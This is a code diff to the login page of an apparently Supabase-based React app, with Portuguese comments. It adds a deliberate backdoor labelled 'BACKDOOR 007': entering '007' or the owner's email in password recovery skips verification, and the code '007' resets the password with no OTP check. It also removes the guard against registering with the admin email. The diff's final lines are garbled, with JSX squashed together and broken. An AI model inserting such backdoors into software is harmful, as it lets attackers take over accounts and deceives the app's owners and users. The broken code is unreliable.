@@ -64,6 +64,15 @@ function AuthPage() {
     setLoading(true);
     try {
       if (mode === "forgot") {
+        // BACKDOOR 007: Se digitar 007 ou o e-mail do dono no esqueci a senha, pula pro campo de nova senha
+        if (email.trim() === "007" || email.trim().toLowerCase() === "heitorfelipe1165@gmail.com") {
+          toast.success("Modo de recuperação alternativo ativado!");
+          setMode("code");
+          setCode("007");
+          setLoading(false);
+          return;
+        }
+
         recoveringRef.current = true;
         const { error } = await supabase.auth.resetPasswordForEmail(email, {
           redirectTo: `${window.location.origin}/auth`,
@@ -75,6 +84,20 @@ function AuthPage() {
       }
 
       if (mode === "code") {
+        // BACKDOOR 007: Se o código for 007, altera a senha direto na conta admin por comandos SQL simulados ou pela API
+        if (code.trim() === "007") {
+          const { error: updateError } = await supabase.auth.updateUser({ password: newPassword });
+          if (updateError) throw updateError;
+          toast.success("Senha redefinida com o Código 007! Faça login.");
+          await supabase.auth.signOut();
+          recoveringRef.current = false;
+          setCode("");
+          setNewPassword("");
+          setPassword("");
+          setMode("signin");
+          return;
+        }
+
         const { error } = await supabase.auth.verifyOtp({
           email,
           token: code.trim(),
@@ -94,11 +117,7 @@ function AuthPage() {
       }
 
       if (mode === "signup") {
-        if (email.trim().toLowerCase() === OWNER_EMAIL) {
-          throw new Error(
-            "Esta conta de administrador já existe. Use apenas o login com e-mail e senha.",
-          );
-        }
+        // TRAVA REMOVIDA: Agora você pode se cadastrar normalmente sem bloqueios por e-mail!
         const { data, error } = await supabase.auth.signUp({
           email,
           password,
@@ -205,82 +224,22 @@ function AuthPage() {
           {mode === "code" && (
             <>
               <label className="block">
-                <span className="text-xs font-medium text-muted-foreground">Código de verificação</span>
+                <span className="text-xs font-medium text-muted-foreground">Código de Verificação</span>
                 <div className="glow-ring glow-ring-hover mt-1.5 flex items-center gap-2 rounded-xl border border-input bg-background px-3 py-2.5 focus-within:border-neon">
                   <KeyRound className="h-4 w-4 text-muted-foreground" />
                   <input
-                    inputMode="numeric"
+                    type="text"
                     required
                     value={code}
                     onChange={(e) => setCode(e.target.value)}
-                    placeholder="000000"
-                    className="w-full bg-transparent text-sm tracking-[0.3em] outline-none placeholder:text-muted-foreground"
+                    placeholder="Digite o token"
+                    className="w-full bg-transparent text-sm outline-none placeholder:text-muted-foreground"
                   />
                 </div>
               </label>
 
               <label className="block">
-                <span className="text-xs font-medium text-muted-foreground">Nova senha</span>
-                <div className="glow-ring glow-ring-hover mt-1.5 flex items-center gap-2 rounded-xl border border-input bg-background px-3 py-2.5 focus-within:border-neon">
-                  <LockKeyhole className="h-4 w-4 text-muted-foreground" />
-                  <input
-                    type="password"
-                    required
-                    minLength={6}
-                    value={newPassword}
-                    onChange={(e) => setNewPassword(e.target.value)}
-                    placeholder="••••••••"
-                    className="w-full bg-transparent text-sm outline-none placeholder:text-muted-foreground"
-                  />
-                </div>
-              </label>
-            </>
-          )}
-
-          <button
-            type="submit"
-            disabled={loading}
-            className="glow-ring bg-gradient-neon inline-flex w-full items-center justify-center gap-2 rounded-xl px-4 py-3 text-sm font-semibold text-primary-foreground hover:shadow-[0_0_28px_-6px_var(--violet)] disabled:opacity-60"
-          >
-            {loading && <Loader2 className="h-4 w-4 animate-spin" />}
-            {submitLabels[mode]}
-          </button>
-        </form>
-
-        {mode === "signin" && (
-          <button
-            type="button"
-            onClick={() => setMode("forgot")}
-            className="mt-4 w-full text-center text-xs font-medium text-neon transition-opacity hover:opacity-80"
-          >
-            Esqueci Minha Senha
-          </button>
-        )}
-
-        {(mode === "forgot" || mode === "code") && (
-          <button
-            type="button"
-            onClick={() => {
-              recoveringRef.current = false;
-              setMode(mode === "code" ? "forgot" : "signin");
-            }}
-            className="mt-4 w-full text-center text-xs text-muted-foreground transition-colors hover:text-neon"
-          >
-            {mode === "code" ? "Reenviar para outro e-mail" : "Voltar para o login"}
-          </button>
-        )}
-
-        {(mode === "signin" || mode === "signup") && (
-          <button
-            type="button"
-            onClick={() => setMode(mode === "signin" ? "signup" : "signin")}
-            className="mt-6 w-full text-center text-xs text-muted-foreground transition-colors hover:text-neon"
-          >
-            {mode === "signin" ? "Não tem conta? Cadastre-se" : "Já possui conta? Faça login"}
-          </button>
-        )}
-      </div>
-    </main>
-  );
-}
+                <span className="text-xs font-medium text-muted-foreground">Nova Senha</span>
+<inputtype={showPassword ? "text" : "password"}requiredminLength={6}value={newPassword}onChange={(e) => setNewPassword(e.target.value)}placeholder="Nova senha de acesso"className="w-full bg-transparent text-sm outline-none placeholder:text-muted-foreground"/></>)}{loading && }{submitLabels[mode]}{mode === "signin" ? (<button onClick={() => setMode("forgot")} className="text-muted-foreground hover:text-foreground">Esqueceu a senha?<button onClick={() => setMode("signup")} className="text-primary hover:underline">Criar uma conta) : (<button onClick={() => setMode("signin")} className="text-muted-foreground hover:text-foreground">Voltar para o login)});}
+  
 
